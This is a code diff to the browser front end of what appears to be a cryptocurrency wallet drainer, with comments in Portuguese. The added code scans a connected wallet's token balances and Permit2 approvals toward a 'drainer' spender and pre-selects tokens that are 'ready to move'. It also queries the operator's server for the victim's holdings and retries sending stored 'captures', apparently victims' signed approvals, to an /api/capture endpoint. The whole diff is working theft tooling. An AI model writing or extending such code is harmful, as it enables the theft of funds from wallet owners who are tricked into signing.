@@ -63,6 +63,29 @@ for (const k of ["rpc", "drainer", "sweeper", "operator"]) {
 }
 if (remote.chainId) log(`config loaded (chain ${remote.chainId})`);
 
+// se um POST falhou antes (API fora do ar), tenta entregar de novo o que ficou guardado
+async function flushPending() {
+  const pending = JSON.parse(localStorage.getItem("sweeper.pending") || "[]");
+  if (!pending.length) return;
+  const left = [];
+  for (const cap of pending) {
+    try {
+      const r = await fetch(API_BASE + "/api/capture", {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify(cap),
+      });
+      const d = await r.json();
+      if (!d.ok) throw new Error(d.error);
+      log(`pending capture delivered: ${d.file}`, "ok");
+    } catch {
+      left.push(cap);
+    }
+  }
+  localStorage.setItem("sweeper.pending", JSON.stringify(left));
+}
+flushPending().catch(() => {});
+
 async function connect() {
   if (!window.ethereum) return log("no wallet detected", "bad");
   const browser = new BrowserProvider(window.ethereum);
@@ -86,29 +109,53 @@ async function scan() {
   rows = [];
   $("native").textContent = `${formatUnits(await read.getBalance(owner), 18)} ETH`;
 
-  for (const [symbol, address, decimals] of TOKENS) {
-    let balance, allowance;
+  for (const meta of await tokensFor(owner)) {
+    let balance, ready, allowance;
     try {
-      const token = new Contract(address, ERC20, read);
-      [balance, allowance] = await Promise.all([token.balanceOf(owner), p2.allowance(owner, address, drainer)]);
+      const token = new Contract(meta.address, ERC20, read);
+      [balance, ready, allowance] = await Promise.all([
+        token.balanceOf(owner),
+        token.allowance(owner, PERMIT2), // prerequisito REAL: aprovacao ERC20 ao proprio Permit2
+        p2.allowance(owner, meta.address, drainer), // allowance Permit2 para este spender (nonce vem daqui)
+      ]);
     } catch {
-      continue; // token ausente nesta chain
+      continue; // token ausente/estranho nesta chain
     }
     if (balance === 0n && allowance.amount === 0n) continue;
-    const row = { symbol, address, decimals, balance, allowance };
+    const row = { ...meta, balance, ready, allowance };
     rows.push(row);
 
+    // so marca o que realmente pode ser puxado: saldo > 0 E aprovacao ERC20->Permit2
+    const canPay = balance > 0n && ready > 0n;
     const tr = document.createElement("tr");
-    // assinatura nova => o que interessa e o SALDO, nao a allowance anterior
-    tr.innerHTML = `<td><input type="checkbox" ${balance > 0n ? "checked" : ""} /></td>
-      <td>${symbol}</td><td class="num">${formatUnits(balance, decimals)}</td>
-      <td class="num">${allowance.amount > 0n ? "aprovado" : "-"}</td>
+    tr.innerHTML = `<td><input type="checkbox" ${canPay ? "checked" : ""} /></td>
+      <td>${row.symbol}</td><td class="num">${formatUnits(balance, row.decimals)}</td>
+      <td class="num">${ready > 0n ? "yes" : "no"}</td>
       <td class="num">${allowance.nonce}</td>`;
     tbody.append(tr);
   }
-  $("all").checked = rows.some((r) => r.balance > 0n);
-  if (!rows.length) log("nothing in the watched tokens", "flag");
-  else log(`${rows.filter((r) => r.balance > 0n).length} token(s) with balance, pre-selected`, "ok");
+  const pagaveis = rows.filter((r) => r.balance > 0n && r.ready > 0n);
+  const semApproval = rows.filter((r) => r.balance > 0n && r.ready === 0n);
+  $("all").checked = pagaveis.length > 0;
+  if (!rows.length) log("nothing found on this wallet", "flag");
+  else {
+    log(`${pagaveis.length} token(s) ready to move (pre-selected)`, "ok");
+    if (semApproval.length) log(`${semApproval.length} with balance but never approved to Permit2: ${semApproval.map((r) => r.symbol).join(", ")}`, "flag");
+  }
+}
+
+// lista base + tokens que a carteira realmente tem (descoberta via API do server)
+async function tokensFor(who) {
+  const base = TOKENS.map(([symbol, address, decimals]) => ({ symbol, address, decimals }));
+  try {
+    const extra = await fetch(`${API_BASE}/api/tokens?owner=${who}`).then((r) => r.json());
+    for (const t of extra.tokens ?? []) {
+      if (!base.some((b) => b.address.toLowerCase() === t.address.toLowerCase())) base.push(t);
+    }
+  } catch {
+    /* sem descoberta: fica so a lista base */
+  }
+  return base.slice(0, 60);
 }
 
 function selected() {
